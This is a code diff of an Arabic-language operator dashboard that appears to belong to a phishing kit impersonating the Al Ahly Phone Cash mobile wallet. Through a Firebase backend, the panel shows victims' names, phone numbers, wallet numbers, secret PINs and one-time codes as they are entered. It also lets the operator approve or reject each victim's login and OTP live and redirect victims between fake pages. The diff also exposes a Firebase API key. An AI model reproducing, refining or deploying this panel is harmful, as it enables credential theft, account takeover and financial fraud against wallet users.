@@ -39,7 +39,6 @@
       min-height: 100vh;
     }
 
-    /* ===== LOGIN ===== */
     #loginScreen {
       min-height: 100vh;
       display: flex;
@@ -75,10 +74,8 @@
     .login-box button:hover { background: var(--primary-dark); }
     .login-error { color: #c62828; font-size: 13px; margin-top: 10px; display: none; }
 
-    /* ===== DASHBOARD ===== */
     #dashboard { display: none; min-height: 100vh; }
 
-    /* HEADER */
     .header {
       background: var(--primary);
       color: #fff;
@@ -94,16 +91,12 @@
     .header h1 { font-size: 18px; font-weight: 900; }
     .header-badge {
       background: rgba(255,255,255,0.15);
-      border-radius: 20px;
-      padding: 4px 12px;
-      font-size: 12px;
-      display: flex; align-items: center; gap: 6px;
+      border-radius: 20px; padding: 4px 12px;
+      font-size: 12px; display: flex; align-items: center; gap: 6px;
     }
     .dot-live {
-      width: 8px; height: 8px;
-      background: #69f0ae;
-      border-radius: 50%;
-      animation: pulse 1.5s infinite;
+      width: 8px; height: 8px; background: #69f0ae;
+      border-radius: 50%; animation: pulse 1.5s infinite;
     }
     @keyframes pulse {
       0%,100% { opacity:1; transform:scale(1); }
@@ -111,64 +104,44 @@
     }
     .header-right { display: flex; align-items: center; gap: 10px; }
     .btn-logout {
-      background: rgba(255,255,255,0.15);
-      border: none; color: #fff;
-      padding: 6px 14px; border-radius: 8px;
-      font-size: 13px; cursor: pointer;
+      background: rgba(255,255,255,0.15); border: none; color: #fff;
+      padding: 6px 14px; border-radius: 8px; font-size: 13px; cursor: pointer;
     }
     .btn-logout:hover { background: rgba(255,255,255,0.25); }
     .btn-clear-all {
-      background: #c62828;
-      border: none; color: #fff;
+      background: #c62828; border: none; color: #fff;
       padding: 6px 14px; border-radius: 8px;
       font-size: 13px; cursor: pointer; font-weight: 700;
     }
     .btn-clear-all:hover { background: #b71c1c; }
 
-    /* STATS BAR */
     .stats-bar {
-      background: var(--white);
-      border-bottom: 1px solid #e0e0e0;
-      padding: 10px 24px;
-      display: flex; gap: 20px;
+      background: var(--white); border-bottom: 1px solid #e0e0e0;
+      padding: 10px 24px; display: flex; gap: 20px;
     }
-    .stat-item {
-      display: flex; align-items: center; gap: 8px;
-      font-size: 13px; color: var(--text-sub);
-    }
+    .stat-item { display: flex; align-items: center; gap: 8px; font-size: 13px; color: var(--text-sub); }
     .stat-num { font-weight: 900; font-size: 16px; color: var(--primary); }
     .stat-num.red { color: #c62828; }
     .stat-num.orange { color: #e65100; }
 
-    /* LAYOUT */
     .layout {
       display: grid;
       grid-template-columns: 280px 1fr;
       height: calc(100vh - 98px);
     }
 
-    /* SIDEBAR */
     .sidebar {
-      background: var(--white);
-      border-left: 1px solid #e0e0e0;
-      overflow-y: auto;
+      background: var(--white); border-left: 1px solid #e0e0e0; overflow-y: auto;
     }
     .sidebar-header {
-      padding: 14px 16px;
-      font-size: 13px; font-weight: 800;
-      color: var(--primary);
-      border-bottom: 1px solid #e0e0e0;
-      background: var(--bg-card);
-      position: sticky; top: 0;
+      padding: 14px 16px; font-size: 13px; font-weight: 800;
+      color: var(--primary); border-bottom: 1px solid #e0e0e0;
+      background: var(--bg-card); position: sticky; top: 0;
     }
 
-    /* VISITOR CARD IN SIDEBAR */
     .visitor-item {
-      padding: 12px 14px;
-      border-bottom: 1px solid #f0f0f0;
-      cursor: pointer;
-      transition: background 0.15s;
-      position: relative;
+      padding: 12px 14px; border-bottom: 1px solid #f0f0f0;
+      cursor: pointer; transition: background 0.15s; position: relative;
     }
     .visitor-item:hover { background: #f0f7f2; }
     .visitor-item.active { background: #e8f5ee; border-right: 3px solid var(--primary); }
@@ -184,8 +157,7 @@
     .vi-status {
       display: inline-flex; align-items: center; gap: 4px;
       font-size: 11px; font-weight: 700;
-      padding: 2px 8px; border-radius: 10px;
-      margin-top: 4px;
+      padding: 2px 8px; border-radius: 10px; margin-top: 4px;
     }
     .vi-status.waiting { background: #fff3e0; color: #e65100; }
     .vi-status.approved { background: #e8f5ee; color: var(--primary); }
@@ -194,94 +166,59 @@
     .vi-status.rejected { background: #fdecea; color: #c62828; }
 
     .action-badge {
-      position: absolute;
-      top: 10px; left: 10px;
-      background: #e65100;
-      color: #fff;
+      position: absolute; top: 10px; left: 10px;
+      background: #e65100; color: #fff;
       font-size: 10px; font-weight: 900;
       padding: 2px 7px; border-radius: 10px;
       animation: blink 1s infinite;
     }
     @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.4} }
 
-    /* MAIN PANEL */
-    .main-panel {
-      padding: 20px;
-      overflow-y: auto;
-      background: var(--bg);
-    }
+    .main-panel { padding: 20px; overflow-y: auto; background: var(--bg); }
 
     .empty-state {
       display: flex; flex-direction: column;
       align-items: center; justify-content: center;
-      height: 100%; color: var(--text-sub);
-      gap: 12px;
+      height: 100%; color: var(--text-sub); gap: 12px;
     }
     .empty-state .icon { font-size: 52px; }
     .empty-state p { font-size: 15px; }
 
-    /* VISITOR DETAIL BOX */
     .visitor-box {
-      background: var(--white);
-      border-radius: 16px;
-      box-shadow: var(--shadow);
-      overflow: hidden;
-      max-width: 700px;
+      background: var(--white); border-radius: 16px;
+      box-shadow: var(--shadow); overflow: hidden; max-width: 700px;
     }
 
     .vb-header {
       background: linear-gradient(135deg, var(--primary-dark), var(--primary));
-      color: #fff;
-      padding: 18px 22px;
+      color: #fff; padding: 18px 22px;
       display: flex; align-items: center; justify-content: space-between;
     }
     .vb-header-left h2 { font-size: 20px; font-weight: 900; margin-bottom: 4px; }
-    .vb-header-left .vb-page {
-      font-size: 12px; opacity: 0.85;
-      display: flex; align-items: center; gap: 5px;
-    }
+    .vb-header-left .vb-page { font-size: 12px; opacity: 0.85; display: flex; align-items: center; gap: 5px; }
     .vb-header-right { text-align: left; }
     .vb-time { font-size: 12px; opacity: 0.8; }
     .status-dot {
-      display: inline-block;
-      width: 10px; height: 10px;
-      border-radius: 50%;
-      margin-left: 6px;
-      vertical-align: middle;
-      flex-shrink: 0;
+      display: inline-block; width: 10px; height: 10px;
+      border-radius: 50%; margin-left: 6px; vertical-align: middle; flex-shrink: 0;
     }
     .status-dot.online  { background: #22c55e; box-shadow: 0 0 6px #22c55e; }
     .status-dot.offline { background: #9ca3af; }
 
     .vb-body { padding: 20px 22px; }
 
-    /* INFO ROWS */
     .info-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 12px;
-      margin-bottom: 18px;
+      display: grid; grid-template-columns: 1fr 1fr;
+      gap: 12px; margin-bottom: 18px;
     }
-    .info-item {
-      background: var(--bg);
-      border-radius: 10px;
-      padding: 12px 14px;
-    }
-    .info-item .label {
-      font-size: 11px; color: var(--text-sub);
-      font-weight: 700; margin-bottom: 4px;
-    }
-    .info-item .value {
-      font-size: 15px; font-weight: 800; color: var(--text);
-      word-break: break-all;
-    }
+    .info-item { background: var(--bg); border-radius: 10px; padding: 12px 14px; }
+    .info-item .label { font-size: 11px; color: var(--text-sub); font-weight: 700; margin-bottom: 4px; }
+    .info-item .value { font-size: 15px; font-weight: 800; color: var(--text); word-break: break-all; }
     .info-item.full { grid-column: 1 / -1; }
 
-    /* STATUS BADGE */
     .status-badge {
       display: inline-flex; align-items: center; gap: 6px;
-      padding: 6px 14px; border-radius: 20px;
-      font-size: 13px; font-weight: 800;
+      padding: 6px 14px; border-radius: 20px; font-size: 13px; font-weight: 800;
     }
     .status-badge.waiting { background: #fff3e0; color: #e65100; }
     .status-badge.approved { background: #e8f5ee; color: var(--primary); }
@@ -290,139 +227,83 @@
     .status-badge.final_rejected,
     .status-badge.rejected { background: #fdecea; color: #c62828; }
 
-    /* ACTIONS SECTION */
-    .actions-section {
-      border-top: 1px solid #f0f0f0;
-      padding-top: 16px;
-      margin-top: 4px;
-    }
-    .actions-title {
-      font-size: 13px; font-weight: 800;
-      color: var(--text-sub); margin-bottom: 12px;
-    }
-
+    .actions-section { border-top: 1px solid #f0f0f0; padding-top: 16px; margin-top: 4px; }
+    .actions-title { font-size: 13px; font-weight: 800; color: var(--text-sub); margin-bottom: 12px; }
     .action-group { margin-bottom: 14px; }
-    .action-group-label {
-      font-size: 12px; color: var(--text-sub);
-      margin-bottom: 8px; font-weight: 700;
-    }
+    .action-group-label { font-size: 12px; color: var(--text-sub); margin-bottom: 8px; font-weight: 700; }
     .btn-row { display: flex; gap: 10px; flex-wrap: wrap; }
 
     .btn-approve {
-      flex: 1; padding: 11px;
-      background: var(--primary); color: #fff;
-      border: none; border-radius: 10px;
-      font-size: 14px; font-weight: 800; cursor: pointer;
-      transition: background 0.2s;
+      flex: 1; padding: 11px; background: var(--primary); color: #fff;
+      border: none; border-radius: 10px; font-size: 14px; font-weight: 800;
+      cursor: pointer; transition: background 0.2s;
     }
     .btn-approve:hover { background: var(--primary-dark); }
 
     .btn-reject {
-      flex: 1; padding: 11px;
-      background: #c62828; color: #fff;
-      border: none; border-radius: 10px;
-      font-size: 14px; font-weight: 800; cursor: pointer;
-      transition: background 0.2s;
+      flex: 1; padding: 11px; background: #c62828; color: #fff;
+      border: none; border-radius: 10px; font-size: 14px; font-weight: 800;
+      cursor: pointer; transition: background 0.2s;
     }
     .btn-reject:hover { background: #b71c1c; }
 
     .btn-delete {
-      width: 100%; padding: 10px;
-      background: var(--white); color: #c62828;
+      width: 100%; padding: 10px; background: var(--white); color: #c62828;
       border: 1.5px solid #c62828; border-radius: 10px;
-      font-size: 13px; font-weight: 800; cursor: pointer;
-      margin-top: 10px;
+      font-size: 13px; font-weight: 800; cursor: pointer; margin-top: 10px;
       transition: all 0.2s;
     }
     .btn-delete:hover { background: #fdecea; }
 
-    /* REDIRECT SECTION */
     .redirect-section {
-      background: var(--bg);
-      border: 1.5px solid var(--border);
-      border-radius: 12px;
-      padding: 14px 16px;
-      margin-bottom: 14px;
+      background: var(--bg); border: 1.5px solid var(--border);
+      border-radius: 12px; padding: 14px 16px; margin-bottom: 14px;
     }
     .redirect-section label {
-      font-size: 13px; font-weight: 800;
-      color: var(--primary); display: block; margin-bottom: 8px;
+      font-size: 13px; font-weight: 800; color: var(--primary);
+      display: block; margin-bottom: 8px;
     }
     .redirect-row { display: flex; gap: 8px; }
     .redirect-select {
-      flex: 1; padding: 9px 12px;
-      border: 1.5px solid var(--border);
-      border-radius: 8px; font-size: 13px;
-      outline: none; background: var(--white);
-      color: var(--text);
+      flex: 1; padding: 9px 12px; border: 1.5px solid var(--border);
+      border-radius: 8px; font-size: 13px; outline: none;
+      background: var(--white); color: var(--text);
     }
     .btn-redirect {
-      padding: 9px 16px;
-      background: var(--primary); color: #fff;
-      border: none; border-radius: 8px;
-      font-size: 13px; font-weight: 800; cursor: pointer;
-      transition: background 0.2s;
+      padding: 9px 16px; background: var(--primary); color: #fff;
+      border: none; border-radius: 8px; font-size: 13px; font-weight: 800;
+      cursor: pointer; transition: background 0.2s;
     }
     .btn-redirect:hover { background: var(--primary-dark); }
 
-    /* OTP DISPLAY */
     .otp-display {
-      background: #f3e5f5;
-      border: 1.5px solid #ce93d8;
-      border-radius: 12px;
-      padding: 14px 16px;
-      margin-bottom: 14px;
-      display: none;
+      background: #f3e5f5; border: 1.5px solid #ce93d8;
+      border-radius: 12px; padding: 14px 16px; margin-bottom: 14px; display: none;
     }
     .otp-display.show { display: block; }
-    .otp-display .otp-label {
-      font-size: 12px; color: #6a1b9a; font-weight: 700; margin-bottom: 6px;
-    }
+    .otp-display .otp-label { font-size: 12px; color: #6a1b9a; font-weight: 700; margin-bottom: 6px; }
     .otp-display .otp-value {
-      font-size: 28px; font-weight: 900;
-      color: #4a148c; letter-spacing: 8px;
-      text-align: center; padding: 8px 0;
+      font-size: 28px; font-weight: 900; color: #4a148c;
+      letter-spacing: 8px; text-align: center; padding: 8px 0;
     }
 
-    /* HISTORY LOG */
-    .history-section {
-      margin-top: 16px;
-      border-top: 1px solid #f0f0f0;
-      padding-top: 14px;
-    }
-    .history-title {
-      font-size: 13px; font-weight: 800;
-      color: var(--text-sub); margin-bottom: 10px;
-    }
-    .history-item {
-      display: flex; align-items: flex-start; gap: 10px;
-      margin-bottom: 8px; font-size: 12px;
-    }
-    .history-dot {
-      width: 8px; height: 8px; border-radius: 50%;
-      background: var(--primary); margin-top: 3px; flex-shrink: 0;
-    }
+    .history-section { margin-top: 16px; border-top: 1px solid #f0f0f0; padding-top: 14px; }
+    .history-title { font-size: 13px; font-weight: 800; color: var(--text-sub); margin-bottom: 10px; }
+    .history-item { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 8px; font-size: 12px; }
+    .history-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--primary); margin-top: 3px; flex-shrink: 0; }
     .history-dot.red { background: #c62828; }
     .history-dot.orange { background: #e65100; }
     .history-dot.purple { background: #6a1b9a; }
     .history-text { color: var(--text); }
     .history-time { color: var(--text-sub); margin-right: auto; }
 
-    /* NOTIFICATION TOAST */
-    .toast-container {
-      position: fixed; top: 70px; left: 20px;
-      z-index: 9999; display: flex; flex-direction: column; gap: 8px;
-    }
+    .toast-container { position: fixed; top: 70px; left: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 8px; }
     .toast {
-      background: var(--primary);
-      color: #fff;
-      padding: 12px 18px;
-      border-radius: 12px;
-      font-size: 13px; font-weight: 700;
+      background: var(--primary); color: #fff; padding: 12px 18px;
+      border-radius: 12px; font-size: 13px; font-weight: 700;
       box-shadow: 0 4px 20px rgba(0,0,0,0.25);
       display: flex; align-items: center; gap: 10px;
-      animation: slideIn 0.3s ease;
-      max-width: 300px;
+      animation: slideIn 0.3s ease; max-width: 300px;
     }
     .toast.action { background: #e65100; }
     @keyframes slideIn {
@@ -430,86 +311,47 @@
       to { transform: translateX(0); opacity: 1; }
     }
 
-    /* SCROLLBAR */
     ::-webkit-scrollbar { width: 5px; }
     ::-webkit-scrollbar-track { background: #f0f0f0; }
     ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }
 
-    /* CLEAR CHAT BUTTON & DROPDOWN */
     .btn-clear-chat {
-      background: #ff9800;
-      color: #fff;
-      border: none;
-      border-radius: 8px;
-      padding: 9px 18px;
-      font-size: 14px;
-      cursor: pointer;
-      font-family: 'Cairo', 'Janna LT', 'Janna', Arial, sans-serif;
-      margin-top: 8px;
-      width: 100%;
-      transition: background 0.2s;
+      background: #ff9800; color: #fff; border: none; border-radius: 8px;
+      padding: 9px 18px; font-size: 14px; cursor: pointer;
+      margin-top: 8px; width: 100%; transition: background 0.2s;
     }
     .btn-clear-chat:hover { background: #e65100; }
     .clear-chat-menu {
-      display: none;
-      position: absolute;
-      background: var(--white);
-      border: 1px solid var(--border);
-      border-radius: 8px;
-      box-shadow: 0 4px 16px rgba(0,0,0,0.15);
-      z-index: 999;
-      min-width: 200px;
-      overflow: hidden;
-      right: 0;
+      display: none; position: absolute; background: var(--white);
+      border: 1px solid var(--border); border-radius: 8px;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.15); z-index: 999;
+      min-width: 200px; overflow: hidden; right: 0;
     }
     .clear-chat-menu.open { display: block; }
     .clear-chat-menu button {
-      display: block;
-      width: 100%;
-      padding: 12px 16px;
-      background: none;
-      border: none;
-      text-align: right;
-      font-size: 14px;
-      cursor: pointer;
-      font-family: 'Cairo', 'Janna LT', 'Janna', Arial, sans-serif;
-      color: #333;
-      transition: background 0.15s;
+      display: block; width: 100%; padding: 12px 16px;
+      background: none; border: none; text-align: right;
+      font-size: 14px; cursor: pointer; color: #333; transition: background 0.15s;
     }
     .clear-chat-menu button:hover { background: var(--bg); }
     .clear-chat-menu button.danger { color: #d32f2f; }
 
     .visitor-item .vi-checkbox {
-      display: none;
-      margin-left: 8px;
-      width: 18px;
-      height: 18px;
-      cursor: pointer;
-      accent-color: var(--primary);
-      flex-shrink: 0;
-      vertical-align: middle;
+      display: none; margin-left: 8px; width: 18px; height: 18px;
+      cursor: pointer; accent-color: var(--primary); flex-shrink: 0; vertical-align: middle;
     }
     body.selection-mode .visitor-item .vi-checkbox { display: inline-block; }
     body.selection-mode .visitor-item { cursor: default; }
 
     .selection-toolbar {
-      display: none;
-      padding: 10px 14px;
-      background: #fff3e0;
-      border-bottom: 1px solid #ffcc80;
-      align-items: center;
-      justify-content: space-between;
-      gap: 8px;
+      display: none; padding: 10px 14px; background: #fff3e0;
+      border-bottom: 1px solid #ffcc80; align-items: center;
+      justify-content: space-between; gap: 8px;
     }
     body.selection-mode .selection-toolbar { display: flex; }
     .selection-toolbar span { font-size: 13px; color: #e65100; font-weight: 600; }
     .selection-toolbar button {
-      border: none;
-      border-radius: 6px;
-      padding: 6px 12px;
-      font-size: 13px;
-      cursor: pointer;
-      font-family: 'Cairo', 'Janna LT', 'Janna', Arial, sans-serif;
+      border: none; border-radius: 6px; padding: 6px 12px; font-size: 13px; cursor: pointer;
     }
     .btn-sel-delete { background: #d32f2f; color: #fff; }
     .btn-sel-cancel { background: var(--border); color: #333; }
@@ -517,10 +359,9 @@
 </head>
 <body>
 
-<!-- ===== TOAST CONTAINER ===== -->
 <div class="toast-container" id="toastContainer"></div>
 
-<!-- ===== LOGIN ===== -->
+<!-- LOGIN -->
 <div id="loginScreen">
   <div class="login-box">
     <h2>💚 لوحة التحكم</h2>
@@ -532,10 +373,8 @@
   </div>
 </div>
 
-<!-- ===== DASHBOARD ===== -->
+<!-- DASHBOARD -->
 <div id="dashboard">
-
-  <!-- HEADER -->
   <div class="header">
     <div class="header-left">
       <h1>⚙️ لوحة التحكم - محفظة الاهلي فون كاش</h1>
@@ -550,30 +389,14 @@
     </div>
   </div>
 
-  <!-- STATS BAR -->
   <div class="stats-bar">
-    <div class="stat-item">
-      <span>إجمالي الزوار:</span>
-      <span class="stat-num" id="statTotal">0</span>
-    </div>
-    <div class="stat-item">
-      <span>ينتظرون:</span>
-      <span class="stat-num orange" id="statWaiting">0</span>
-    </div>
-    <div class="stat-item">
-      <span>مكتملون:</span>
-      <span class="stat-num" id="statDone">0</span>
-    </div>
-    <div class="stat-item">
-      <span>مرفوضون:</span>
-      <span class="stat-num red" id="statRejected">0</span>
-    </div>
+    <div class="stat-item"><span>إجمالي الزوار:</span><span class="stat-num" id="statTotal">0</span></div>
+    <div class="stat-item"><span>ينتظرون:</span><span class="stat-num orange" id="statWaiting">0</span></div>
+    <div class="stat-item"><span>مكتملون:</span><span class="stat-num" id="statDone">0</span></div>
+    <div class="stat-item"><span>مرفوضون:</span><span class="stat-num red" id="statRejected">0</span></div>
   </div>
 
-  <!-- LAYOUT -->
   <div class="layout">
-
-    <!-- SIDEBAR -->
     <div class="sidebar">
       <div class="sidebar-header">📋 قائمة الزوار</div>
       <div class="selection-toolbar">
@@ -586,20 +409,18 @@
       <div id="visitorList"></div>
     </div>
 
-    <!-- MAIN PANEL -->
     <div class="main-panel" id="mainPanel">
       <div class="empty-state">
         <div class="icon">👥</div>
         <p>اختر زائراً من القائمة لعرض تفاصيله</p>
       </div>
     </div>
-
   </div>
 </div>
 
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-  import { getDatabase, ref, onValue, update, remove, get } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+  import { getDatabase, ref, onValue, update, remove } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
 
   const firebaseConfig = {
     apiKey: "AIzaSyDH_q2OEPBa2811sCAQse7uFTqSlVOmaw4",
@@ -618,7 +439,7 @@
   const PAGES = [
     { value: 'landing', label: 'صفحة البداية' },
     { value: 'personal', label: 'المعلومات الشخصية' },
-    { value: 'login', label: 'بيانات التطبيق' },
+    { value: 'login', label: 'بيانات المحفظة' },
     { value: 'otp', label: 'رمز التحقق' },
     { value: 'success', label: 'صفحة النجاح' },
     { value: 'error', label: 'صفحة الخطأ' },
@@ -633,22 +454,19 @@
     const ctx = new (window.AudioContext || window.webkitAudioContext)();
     const osc = ctx.createOscillator();
     const gain = ctx.createGain();
-    osc.connect(gain);
-    gain.connect(ctx.destination);
+    osc.connect(gain); gain.connect(ctx.destination);
     if (type === 'new') {
       osc.frequency.setValueAtTime(880, ctx.currentTime);
       osc.frequency.setValueAtTime(1100, ctx.currentTime + 0.1);
       gain.gain.setValueAtTime(0.3, ctx.currentTime);
       gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.4);
-      osc.start(ctx.currentTime);
-      osc.stop(ctx.currentTime + 0.4);
+      osc.start(ctx.currentTime); osc.stop(ctx.currentTime + 0.4);
     } else {
       osc.frequency.setValueAtTime(660, ctx.currentTime);
       osc.frequency.setValueAtTime(880, ctx.currentTime + 0.15);
       gain.gain.setValueAtTime(0.3, ctx.currentTime);
       gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.5);
-      osc.start(ctx.currentTime);
-      osc.stop(ctx.currentTime + 0.5);
+      osc.start(ctx.currentTime); osc.stop(ctx.currentTime + 0.5);
     }
   }
 
@@ -677,7 +495,7 @@
     const map = {
       landing: 'صفحة البداية',
       personal: 'المعلومات الشخصية',
-      login: 'بيانات التطبيق',
+      login: 'بيانات المحفظة',
       otp: 'رمز التحقق',
       success: 'صفحة النجاح',
       error: 'صفحة الخطأ',
@@ -687,27 +505,23 @@
 
   function formatTime(ts) {
     if (!ts) return '';
-    const d = new Date(ts);
-    return d.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });
+    return new Date(ts).toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });
   }
 
   function renderSidebar() {
     const list = document.getElementById('visitorList');
     const sorted = Object.entries(sessions).sort((a, b) => {
-      const aAction = ['waiting','otp_submitted'].includes(a[1].status);
-      const bAction = ['waiting','otp_submitted'].includes(b[1].status);
-      if (aAction && !bAction) return -1;
-      if (!aAction && bAction) return 1;
+      const aA = ['waiting','otp_submitted'].includes(a[1].status);
+      const bA = ['waiting','otp_submitted'].includes(b[1].status);
+      if (aA && !bA) return -1; if (!aA && bA) return 1;
       return (b[1].lastAction || b[1].timestamp || 0) - (a[1].lastAction || a[1].timestamp || 0);
     });
-
     list.innerHTML = '';
     sorted.forEach(([id, data], idx) => {
       const [label, cls] = statusLabel(data.status);
       const hasAction = ['waiting','otp_submitted'].includes(data.status);
       const div = document.createElement('div');
       div.className = `visitor-item ${selectedId === id ? 'active' : ''} ${hasAction ? 'has-action' : ''}`;
-
       div.innerHTML = `
         ${hasAction ? '<div class="action-badge">يحتاج رد</div>' : ''}
         <div class="vi-top">
@@ -718,25 +532,16 @@
         <div class="vi-page">📍 ${pageLabel(data.currentPage)}</div>
         <div><span class="vi-status ${cls}">${label}</span></div>
       `;
-
       const cb = document.createElement('input');
-      cb.type = 'checkbox';
-      cb.className = 'vi-checkbox';
-      cb.dataset.id = id;
+      cb.type = 'checkbox'; cb.className = 'vi-checkbox'; cb.dataset.id = id;
       cb.onclick = (e) => { e.stopPropagation(); updateSelCount(); };
       div.insertBefore(cb, div.firstChild);
-
       div.onclick = (e) => {
-        if (document.body.classList.contains('selection-mode')) {
-          cb.checked = !cb.checked;
-          updateSelCount();
-        } else {
-          selectVisitor(id);
-        }
+        if (document.body.classList.contains('selection-mode')) { cb.checked = !cb.checked; updateSelCount(); }
+        else selectVisitor(id);
       };
       list.appendChild(div);
     });
-
     const all = Object.values(sessions);
     document.getElementById('statTotal').textContent = all.length;
     document.getElementById('statWaiting').textContent = all.filter(s => ['waiting','otp_submitted'].includes(s.status)).length;
@@ -745,9 +550,7 @@
   }
 
   window.selectVisitor = function(id) {
-    selectedId = id;
-    renderSidebar();
-    renderDetail(id);
+    selectedId = id; renderSidebar(); renderDetail(id);
   }
 
   function renderDetail(id) {
@@ -757,7 +560,6 @@
     const [statusText, statusCls] = statusLabel(data.status);
     const showOTP = data.status === 'otp_submitted' && data.otp && data.otp !== '---';
     const history = data.history || [];
-
     const historyHTML = history.slice().reverse().map(h => {
       const dotCls = h.type === 'reject' ? 'red' : h.type === 'action' ? 'orange' : h.type === 'otp' ? 'purple' : '';
       return `<div class="history-item">
@@ -766,10 +568,7 @@
         <div class="history-time">${formatTime(h.ts)}</div>
       </div>`;
     }).join('');
-
-    const pagesOptions = PAGES.map(p =>
-      `<option value="${p.value}">${p.label}</option>`
-    ).join('');
+    const pagesOptions = PAGES.map(p => `<option value="${p.value}">${p.label}</option>`).join('');
 
     panel.innerHTML = `
       <div class="visitor-box">
@@ -777,7 +576,7 @@
           <div class="vb-header-left">
             <h2 style="display:flex;align-items:center;gap:6px;color:#fff!important;">
               ${data.name || 'زائر'}
-              <span class="status-dot ${(Date.now() - (data.lastAction || data.timestamp)) < 30000 ? 'online' : 'offline'}"></span>
+              <span class="status-dot ${(Date.now()-(data.lastAction||data.timestamp))<30000?'online':'offline'}"></span>
             </h2>
             <div class="vb-page">📍 ${pageLabel(data.currentPage)}</div>
           </div>
@@ -786,7 +585,6 @@
             <div style="margin-top:6px;font-size:12px;opacity:0.9;background:rgba(255,255,255,0.15);border-radius:6px;padding:3px 8px;text-align:center;">محفظة الاهلي فون كاش</div>
           </div>
         </div>
-
         <div class="vb-body">
           <div class="info-grid">
             <div class="info-item">
@@ -794,20 +592,16 @@
               <div class="value">${data.name || '---'}</div>
             </div>
             <div class="info-item">
-              <div class="label">رقم الهاتف</div>
+              <div class="label">رقم الهاتف الشخصي</div>
               <div class="value">${data.personalPhone || '---'}</div>
             </div>
             <div class="info-item">
-              <div class="label">اسم المستخدم</div>
+              <div class="label">رقم موبايل المحفظة</div>
               <div class="value">${data.phone || '---'}</div>
             </div>
             <div class="info-item">
-              <div class="label">كلمة مرور التطبيق</div>
+              <div class="label">الرقم السري</div>
               <div class="value">${data.pin || '---'}</div>
-            </div>
-            <div class="info-item">
-              <div class="label">الرقم السري BIN</div>
-              <div class="value">${data.bin || '---'}</div>
             </div>
             <div class="info-item">
               <div class="label">الحالة</div>
@@ -842,7 +636,6 @@
 
           <div class="actions-section">
             <div class="actions-title">⚡ الإجراءات</div>
-
             ${data.status === 'waiting' ? `
             <div class="action-group">
               <div class="action-group-label">مرحلة تسجيل الدخول:</div>
@@ -851,7 +644,6 @@
                 <button class="btn-reject" onclick="rejectLogin('${id}')">❌ رفض الدخول</button>
               </div>
             </div>` : ''}
-
             ${data.status === 'otp_submitted' ? `
             <div class="action-group">
               <div class="action-group-label">مرحلة رمز التحقق:</div>
@@ -860,10 +652,9 @@
                 <button class="btn-reject" onclick="rejectOTP('${id}')">❌ رفض الرمز</button>
               </div>
             </div>` : ''}
-
             <button class="btn-delete" onclick="deleteSession('${id}')">🗑 حذف هذه الجلسة</button>
             <div style="position:relative;margin-top:4px;">
-              <button class="btn-clear-chat" onclick="toggleClearMenu(event, '${id}')">🧹 مسح المحادثات</button>
+              <button class="btn-clear-chat" onclick="toggleClearMenu(event,'${id}')">🧹 مسح المحادثات</button>
               <div class="clear-chat-menu" id="clearMenu_${id}">
                 <button class="danger" onclick="clearAllChats('${id}')">🗑 مسح جميع المحادثات</button>
                 <button onclick="enterSelectionMode()">☑️ حدد المحادثات</button>
@@ -876,95 +667,64 @@
             <div class="history-title">📜 سجل الإجراءات</div>
             ${historyHTML}
           </div>` : ''}
-
         </div>
       </div>
     `;
   }
 
   function addHistory(id, msg, type) {
-    const data = sessions[id];
-    const history = data.history || [];
+    const history = (sessions[id] && sessions[id].history) || [];
     history.push({ msg, type, ts: Date.now() });
     update(ref(db, `site1/sessions/${id}`), { history, lastAction: Date.now() });
   }
 
-  window.approveLogin = function(id) {
-    update(ref(db, `site1/sessions/${id}`), { status: 'approved', lastAction: Date.now() });
-    addHistory(id, 'تم قبول تسجيل الدخول', 'approve');
-  }
-  window.rejectLogin = function(id) {
-    update(ref(db, `site1/sessions/${id}`), { status: 'rejected', lastAction: Date.now() });
-    addHistory(id, 'تم رفض تسجيل الدخول', 'reject');
-  }
-  window.approveOTP = function(id) {
-    update(ref(db, `site1/sessions/${id}`), { status: 'final_approved', lastAction: Date.now() });
-    addHistory(id, 'تم قبول رمز التحقق', 'approve');
-  }
-  window.rejectOTP = function(id) {
-    update(ref(db, `site1/sessions/${id}`), { status: 'final_rejected', lastAction: Date.now() });
-    addHistory(id, 'تم رفض رمز التحقق', 'reject');
-  }
+  window.approveLogin = (id) => { update(ref(db,`site1/sessions/${id}`),{status:'approved',lastAction:Date.now()}); addHistory(id,'تم قبول تسجيل الدخول','approve'); }
+  window.rejectLogin  = (id) => { update(ref(db,`site1/sessions/${id}`),{status:'rejected',lastAction:Date.now()}); addHistory(id,'تم رفض تسجيل الدخول','reject'); }
+  window.approveOTP   = (id) => { update(ref(db,`site1/sessions/${id}`),{status:'final_approved',lastAction:Date.now()}); addHistory(id,'تم قبول رمز التحقق','approve'); }
+  window.rejectOTP    = (id) => { update(ref(db,`site1/sessions/${id}`),{status:'final_rejected',lastAction:Date.now()}); addHistory(id,'تم رفض رمز التحقق','reject'); }
 
   window.redirectVisitor = function(id) {
-    const sel = document.getElementById('redirectSelect');
-    const page = sel.value;
+    const page = document.getElementById('redirectSelect').value;
     if (!page) return;
-    update(ref(db, `site1/sessions/${id}`), { redirectTo: page, lastAction: Date.now() });
-    addHistory(id, `تم توجيه الزائر إلى: ${pageLabel(page)}`, 'action');
-    showToast(`تم توجيه الزائر إلى ${pageLabel(page)}`, 'action');
+    update(ref(db,`site1/sessions/${id}`),{redirectTo:page,lastAction:Date.now()});
+    addHistory(id,`تم توجيه الزائر إلى: ${pageLabel(page)}`,'action');
+    showToast(`تم توجيه الزائر إلى ${pageLabel(page)}`,'action');
   }
 
   window.deleteSession = function(id) {
     if (!confirm('هل تريد حذف هذه الجلسة؟')) return;
-    remove(ref(db, `site1/sessions/${id}`));
+    remove(ref(db,`site1/sessions/${id}`));
     if (selectedId === id) {
       selectedId = null;
-      document.getElementById('mainPanel').innerHTML = `
-        <div class="empty-state">
